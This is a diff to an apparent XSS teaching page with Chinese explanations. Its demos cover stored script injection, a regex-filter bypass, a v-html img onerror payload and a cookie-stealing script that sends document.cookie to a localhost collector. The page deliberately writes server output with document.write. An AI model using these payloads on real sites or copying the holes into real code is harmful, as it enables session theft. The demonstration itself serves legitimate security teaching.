@@ -10,18 +10,63 @@
   <div class="app">
     <h1>web safe test</h1>
     <div class="card">
-      <p>例子1:黑客在网站的评论区评论了一段脚本,服务端直接这段脚本当作评论内容返回给了用户,这时候其他用户在查看评论的时候就会执行这段脚本!</p>
+      <p>demo1: 黑客在网站的评论区评论了一段脚本,服务端直接这段脚本当作评论内容返回给了用户,这时候其他用户在查看评论的时候就会执行这段脚本!</p>
       <button type="button" onclick="handleTest1()">测试</button>
     </div>
 
     <div class="card">
-      <p>例子2:使用正则替换并不靠谱!</p>
-      <input id="test2" type="name" value="<scscriptript>alert(1)</scripscriptt>">
+      <p>demo2: 在后端使用了正则对字符进行替换:<span class="code">xxx.replace(/script/ig, '')</span></p>
+      <p>可见使用正则替换字符串并不靠谱!</p>
+      <p><input id="test2" class="test2" type="name" value="<scscriptript>alert(1)</scripscript>"></p>
       <button type="button" onclick="handleTest2()">测试</button>
+    </div>
+
+    <div id="test3" class="card">
+      <p>demo3: v-html</p>
+      <div v-html="html"></div>
+      <p>可以看到,v-html中的script代码并没有执行,那为什么还说v-html有被xss攻击的风险呢? </p>
+      <p>首先,html5中为了安全，不会执行innerHTML中插入的script, 但是如果插入的不是script呢, 比如是image:
+        <code>
+          {{ escapeHtml }}
+        </code>
+      </p>
+      <button type="button" @click="handleTest3">测试</button>
+      <p>测试一下,发现又被攻击了!</p>
+    </div>
+
+    <div class="card">
+      <p>demo4: 盗取cookie,攻击者在网站注入获取cookie的攻击脚本,如果此脚本被提供给了其他用户,其他用户在访问网站时,cookie会被传送给攻击者!</p>
+      <p><input class="test3 cookie" type="textarea" value="<script>fetch('http://localhost:4000/transfer_cookie?s='+document.cookie)</script>" /></p>
+      <button type="button" onclick="handleTest4()">测试</button>
     </div>
   </div>
 </body>
 <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script type="importmap">
+  {
+    "imports": {
+      "vue": "https://unpkg.com/vue@3/dist/vue.esm-browser.js"
+    }
+  }
+</script>
+
+<script type="module">
+  import { createApp } from 'vue'
+
+  createApp({
+    data() {
+      return {
+        html: "<span>这是包含了script的动态html内容<script>alert(1)<\/script></span>",
+        escapeHtml: "<img src onerror='alert(1)'/>"
+      }
+    },
+    methods: {
+      handleTest3() {
+        this.html = this.escapeHtml
+      }
+    }
+  }).mount('#test3')
+</script>
 <script>
   const base = 'http://localhost:4000'
   function handleTest1() {
@@ -45,8 +90,29 @@
       }
     }).then(res => {
       const result = res.data
-      console.log(result)
+      document.write(result)
     })
   }
+
+  function handleTest4() {
+    document.cookie = "name=pluto"
+    const dom = document.querySelector('.test3.cookie')
+    document.write('<p>cookie已经被传送到localhost:4000,可以在服务端控制台查看到</p>' + dom.value)
+  }
 </script>
+<style>
+  .test2 {
+    width: 220px;
+  }
+  .test3 {
+    width: 600px;
+  }
+  .code {
+    background: gray;
+    color: blue;
+    margin: 0 5px;
+    padding: 2px;
+    border-radius: 2px;
+  }
+</style>
 </html>
